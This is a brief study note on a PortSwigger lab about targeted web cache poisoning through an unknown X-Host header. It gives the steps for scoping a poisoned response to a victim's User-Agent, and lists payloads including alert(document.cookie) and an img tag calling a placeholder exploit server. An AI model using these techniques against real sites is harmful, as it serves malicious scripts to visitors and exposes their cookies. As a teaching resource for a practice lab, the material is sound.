# Lab: Targeted web cache poisoning using an unknown header

**Official PortSwigger URL:** https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header

**Lab idea:** The challenge focuses on finding a header that affects a response and understanding how cache variation can target a subset of users. It practices investigating cache behavior and recognizing that a poisoned response may be scoped to a particular client class rather than served identically to everyone.

## Vulnerability in brief
Web cache poisoning is a vulnerability in which an attacker causes a cache to store a harmful HTTP response and then serves that response to other users. In general, the attack requires both an input that changes the back-end response and a way to have the resulting response cached. A cache identifies requests using a cache key, usually a subset of request components; inputs omitted from that key are unkeyed. If an unkeyed value influences the response, the cache may treat a harmful response as interchangeable with a normal one. [PortSwigger's topic guide](https://portswigger.net/web-security/web-cache-poisoning)

## Solution idea
1. With Burp running, load the website's home page.
2. In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated.
3. With the Param Miner extension enabled, right-click on the request and select "Guess headers".
4. Send the GET request to Burp Repeater and add a cache-buster query parameter.
- …
6. Go back to your malicious request in Burp Repeater and paste the victim's User-Agent into the corresponding header.
7. Keep sending the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.
8. Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved

## Payloads / key values
- `GET`
- `X-Host`
- `example.com`
- `/resources/js/tracking.js`
- `alert(document.cookie)`
- `X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
- `X-Cache: hit`
- `alert()`
- `Vary`
- `User-Agent`
- `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />`

## Official source
- [PortSwigger Academy: Lab: Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)
